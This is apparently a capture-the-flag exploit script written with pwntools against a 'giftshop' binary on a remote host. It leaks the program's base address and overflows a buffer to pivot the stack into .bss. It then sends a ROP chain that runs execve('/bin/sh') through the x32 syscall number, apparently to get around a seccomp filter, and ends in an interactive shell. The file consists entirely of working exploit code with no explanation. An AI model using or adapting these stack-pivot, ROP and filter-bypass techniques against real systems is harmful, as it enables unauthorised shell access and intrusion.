from pwn import *
#context(log_level='debug')
re = 1
if re == 0:
	elf = ELF('./giftshop')
	p = process(elf.path)
	print proc.pidof(p)[0]
	raw_input()
else:
	p = remote('198.13.45.44', 26129)

p.recvuntil('!\n')
base_addr = int(p.recvuntil('\n')[2:-1],16) - 0x2030d8
print hex(base_addr)
p.sendlineafter('??\n','1')
p.sendlineafter(': \n','1')
p.sendlineafter('choice:\n','4')
p.sendlineafter('Y/N??\n','Y')
p.sendlineafter('name\n','1')
p.sendlineafter('thing??\n','/home/gift/flag.txt')
p.sendlineafter('choice:\n','1')
p.sendlineafter('y/n\n','n')
p.sendlineafter('1\n','1')
p.sendlineafter('!!\n','6')
p.sendlineafter('y/n\n','y')
p.sendlineafter(': \n','1')
bss_addr = base_addr + 0x203f00
payload = p64(0)*26+p64(bss_addr)+p64(base_addr+0x18b9)
p.sendlineafter(':\n',payload)

pop_rdi = base_addr + 0x000000000000225f
pop_rax = base_addr + 0x0000000000002267
pop_rsi = base_addr + 0x0000000000002261
pop_rbp = base_addr + 0x0000000000000cd0
lev_ret = base_addr + 0x0000000000001176
syscall = base_addr + 0x0000000000002254 
payload = p64(0) + p64(pop_rdi) + p64(bss_addr-0x90) + p64(pop_rax) + p64(0x40000000+59) + p64(pop_rsi) + p64(0) + p64(syscall) + '/bin/sh\0' + p64(0)*17 + p64(bss_addr-0xd0) + p64(lev_ret)
p.sendline(payload)
p.interactive()
